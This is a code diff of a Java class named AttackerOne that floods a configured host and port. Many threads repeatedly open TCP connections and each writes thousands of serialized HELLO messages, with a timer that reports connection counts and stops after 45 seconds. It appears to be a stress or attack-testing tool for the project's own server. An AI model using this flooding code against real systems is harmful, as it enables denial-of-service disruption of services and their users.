@@ -5,13 +5,17 @@
  */
 package core.components.attacker;
 
-import static core.components.attacker.AttackerTwo.i;
-import core.management.CoreConfiguration;
+import core.management.ByteArrayWrap;
 import core.management.CoreProperties;
+import core.management.Message;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
 import java.util.Random;
+import java.util.Timer;
+import java.util.TimerTask;
 
 /**
  *
@@ -27,6 +31,9 @@ public class AttackerOne implements Runnable {
     private Random rand;
     int threads;
     Attack[] attack;
+    ConnectionTask task;
+    Timer timer2;
+    Counter up, totalUp, totalDown;
 
     public AttackerOne(int threads) {
         this.ip = prop.ip;
@@ -35,6 +42,13 @@ public class AttackerOne implements Runnable {
         this.rand = new Random();
         rand.nextBytes(payload);
         this.threads = threads;
+        this.up = new Counter();
+        this.totalUp = new Counter();
+        this.totalDown = new Counter();
+        task = new ConnectionTask();
+        timer2 = new Timer();
+        timer2.schedule(task, 0, 1000); //delay in milliseconds
+
         attack = new Attack[threads];
         for (int j = 0; j < threads; j++) {
             attack[j] = new Attack();
@@ -47,51 +61,72 @@ public class AttackerOne implements Runnable {
             new Thread(attack[j]).start();
         }
     }
-}
 
-class Attack implements Runnable {
+    class ConnectionTask extends TimerTask {
 
-    public Attack() {
-        System.out.println("Execution=" + i++);
+        int secs = 0;
+
+        ConnectionTask() {
+
+        }
+
+        @Override
+        public void run() {
+            System.out.println("Connections=" + up + " total up=" + totalUp + " total down=" + totalDown + " elapsed=" + secs++);
+            if(secs==45){
+                System.exit(0);
+            }
+
+        }
+
     }
 
-    @Override
-    public void run() {
-        Socket socket = null;
-        DataOutputStream out = null;
-        try {
-            socket = new Socket(CoreProperties.ip, CoreProperties.destiny_port);
-            out = new DataOutputStream(socket.getOutputStream());
-            CoreConfiguration.print("Connected to=" + CoreProperties.ip + ":" + CoreProperties.destiny_port);
-            int k = 0;
+    class Attack implements Runnable {
+
+        public Attack() {
+
+        }
+
+        @Override
+        public void run() {
+            byte[] arr = new byte[100];
+            Message send = new Message(Message.HELLO, 100, 10, arr);
+            Socket socket = null;
+            DataOutputStream out = null;
+
+            byte[] serl = new byte[120];
+            ByteBuffer serialized = ByteBuffer.allocate(100+20).order(ByteOrder.BIG_ENDIAN);
+            int numbytes = send.serialize(serl, serialized);
+            ByteArrayWrap b = new ByteArrayWrap(serl, (numbytes));
+
             while (true) {
-                out.write(new byte[]{10});
-                out.flush();
-                k++;
-                if (k == 5000) {
-                    break;
-                }
-            }
-            if (socket != null) {
-                if (out != null) {
-                    out.close();
-                }
-                socket.close();
-            }
-            new Attack().run();
-        } catch (Exception ex) {
-            try {
-                if (socket != null) {
-                    if (out != null) {
-                        out.close();
+                try {
+                    socket = new Socket(CoreProperties.ip, CoreProperties.destiny_port);
+                    out = new DataOutputStream(socket.getOutputStream());
+                    up.incrementeCounter();
+                    totalUp.incrementeCounter();
+                    int k = 0;
+                    while (k < 5000) {
+                        out.writeInt(b.getSize());
+                        out.write(b.getArr(), 0, b.getSize());
+                        out.flush();
+                        k++;
                     }
-                    socket.close();
+                    if (socket != null) {
+                        if (out != null) {
+                            out.close();
+                        }
+                        socket.close();
+                        up.decrementCounter();
+                        totalDown.incrementeCounter();
+                    }
+                } catch (Exception ex) {
+                    System.out.println("Execption::: " + ex.getMessage());
+                    new Attack();
                 }
-                new Attack().run();
-            } catch (IOException ex1) {
-                new Attack().run();
-                System.out.println("Execption::: " + ex1.getMessage());
             }
         }
+
     }
+
 }
